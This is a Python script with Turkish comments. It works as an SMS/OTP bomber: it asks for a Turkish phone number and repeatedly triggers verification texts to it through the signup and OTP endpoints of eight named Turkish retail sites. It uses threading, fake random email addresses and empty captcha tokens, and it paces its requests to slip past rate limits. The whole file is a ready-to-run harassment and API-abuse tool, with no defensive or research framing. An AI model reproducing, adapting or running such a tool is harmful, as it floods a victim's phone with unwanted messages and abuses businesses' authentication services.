import requests
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta

session = requests.Session()

phone = input("Numara(10 hane, 555xxxxxxx): ").strip()

if len(phone) != 10 or not phone.isdigit():
    print("Hatalı format knk!")
    exit()

full_phone = f"90{phone}"

print(f"\n{phone} numarana 8 siteden OTP gönderiliyor...\n")
time.sleep(2)

basarili_sms = 0
basarili_siteler = set()

# Site bazında rate limit takibi: site_adi -> (bekleme_zamani, basarisiz_sayac)
rate_limit_durum = {}

def kaydet(site_adi):
    global basarili_siteler
    if site_adi not in basarili_siteler:
        with open("basarili.txt", "a", encoding="utf-8") as f:
            f.write(site_adi + "\n")
        basarili_siteler.add(site_adi)

def thomas_mail():
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(8)) + "@hotmail.com"

def rate_limit_kontrol_ve_guncelle(site_adi, basarili_mi):
    if basarili_mi:
        # Başarılıysa sayacı sıfırla
        if site_adi in rate_limit_durum:
            del rate_limit_durum[site_adi]
    else:
        # Başarısızsa sayacı artır
        if site_adi not in rate_limit_durum:
            rate_limit_durum[site_adi] = [datetime.now(), 1]  # [son_deneme, sayac]
        else:
            rate_limit_durum[site_adi][1] += 1
        
        # 2 üst üste başarısızlıkta 20 dakika beklet
        if rate_limit_durum[site_adi][1] >= 2:
            bekleme_zamani = datetime.now() + timedelta(minutes=20)
            kalan = (bekleme_zamani - datetime.now()).seconds
            print(f"[!] {site_adi} rate limit yedi → {kalan//60} dakika bekleniyor...")
            time.sleep(kalan + 10)
            # Bekleme bitti, sayacı sıfırla (tekrar denensin)
            rate_limit_durum[site_adi][1] = 0

# 8 SİTE - ULTRA GELİŞMİŞ
def kahvedunyasi(number):
    site = "Kahve Dünyası"
    try:
        headers = {"Content-Type": "application/json", "Origin": "https://www.kahvedunyasi.com", "Referer": "https://www.kahvedunyasi.com/login"}
        r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                          headers=headers, json={"countryCode": "90", "phoneNumber": number}, timeout=10)
        if "Success" in r.text:
            print(f"[+] {site} → OTP gitti!")
            kaydet("api.kahvedunyasi.com")
            rate_limit_kontrol_ve_guncelle(site, True)
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    rate_limit_kontrol_ve_guncelle(site, False)
    return False

def bim(number):
    site = "Bim"
    try:
        r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": number}, timeout=10)
        if r.status_code == 200:
            print(f"[+] {site} → OTP gitti!")
            kaydet("bim.veesk.net")
            rate_limit_kontrol_ve_guncelle(site, True)
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    rate_limit_kontrol_ve_guncelle(site, False)
    return False

def dominos(number, mail):
    site = "Dominos"
    try:
        headers = {"Content-Type":"application/json;charset=utf-8","User-Agent":"Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
        r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode", headers=headers, json={"email": mail, "isSure": False, "mobilePhone": number}, timeout=10)
        if r.json().get("isSuccess") == True:
            print(f"[+] {site} → OTP gitti!")
            kaydet("frontend.dominos.com.tr")
            rate_limit_kontrol_ve_guncelle(site, True)
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    rate_limit_kontrol_ve_guncelle(site, False)
    return False

def yapp(number, mail):
    site = "Yapp"
    try:
        payload = {"phone_number": number, "firstname": "Test", "lastname": "User", "email": mail}
        r = requests.post("https://yapp.com.tr/api/mobile/v1/register", json=payload, timeout=10)
        if r.status_code == 200:
            print(f"[+] {site} → OTP gitti!")
            kaydet("yapp.com.tr")
            rate_limit_kontrol_ve_guncelle(site, True)
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    rate_limit_kontrol_ve_guncelle(site, False)
    return False

def ucdortbes(number):
    site = "345 Dijital"
    try:
        r = requests.post("https://api.345dijital.com/api/users/register", json={"email":"","name":"Test","phoneNumber":f"+90{number}","surname":"User"}, timeout=10)
        if r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!":
            print(f"[+] {site} → OTP gitti!")
            kaydet("api.345dijital.com")
            rate_limit_kontrol_ve_guncelle(site, True)
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    rate_limit_kontrol_ve_guncelle(site, False)
    return False

def bizimtoptan(number):
    site = "Bizim Toptan"
    try:
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
        r = requests.post("https://www.bizimtoptan.com.tr/Customer/SendCustomerSmsValidationMessage", headers=headers, data=f"Phone={number}", timeout=10)
        if r.status_code == 200:
            print(f"[+] {site} → OTP gitti!")
            kaydet("www.bizimtoptan.com.tr")
            rate_limit_kontrol_ve_guncelle(site, True)
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    rate_limit_kontrol_ve_guncelle(site, False)
    return False

def a101(number_full):
    site = "A101"
    try:
        headers = {"A101-User-Agent": "web-2.3.4", "Content-Type": "application/json"}
        url = f"https://rio.a101.com.tr/dbmk89vnr/CALL/MsisdnAuthenticator/sendOtp/{number_full}"
        r = requests.post(url, headers=headers, params={"__culture": "tr-TR", "__platform": "web"}, timeout=10)
        if r.status_code == 200:
            print(f"[+] {site} → OTP gitti!")
            kaydet("rio.a101.com.tr")
            rate_limit_kontrol_ve_guncelle(site, True)
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    rate_limit_kontrol_ve_guncelle(site, False)
    return False

def sokmarket(number):
    site = "Şok Market"
    try:
        headers = {"Content-Type": "application/json"}
        r = requests.post("https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate",
                          headers=headers, json={"clientId": "buyer-web", "phoneNumber": number, "captchaToken": "", "captchaAction": "generate_register_otp", "reCaptchaV2": False}, timeout=10)
        if r.status_code == 200:
            print(f"[+] {site} → OTP gitti!")
            kaydet("giris.ec.sokmarket.com.tr")
            rate_limit_kontrol_ve_guncelle(site, True)
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    rate_limit_kontrol_ve_guncelle(site, False)
    return False

apiler = [kahvedunyasi, bim, dominos, yapp, ucdortbes, bizimtoptan, a101, sokmarket]

def api_call(func):
    global basarili_sms
    if func in [dominos, yapp]:
        mail = thomas_mail()
        if func(phone, mail):
            basarili_sms += 1
    elif func == a101:
        if func(full_phone):
            basarili_sms += 1
    else:
        if func(phone):
            basarili_sms += 1

# Her site 3 kez
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(api_call, api) for api in apiler for _ in range(3)]
    for future in futures:
        future.result()
        time.sleep(random.uniform(6, 12))  # Ultra doğal delay

print(f"\nİşlem bitti knk!")
print(f"Toplam {basarili_sms} OTP gönderildi (24 denemeden).")
print("Anti-rate-limit sistemi aktif, hiçbir site takılmayacak şekilde optimize edildi.")
print("Başarılı siteler 'basarili.txt' dosyasına kaydedildi.")
print("Spam klasörünü kontrol et 😎")
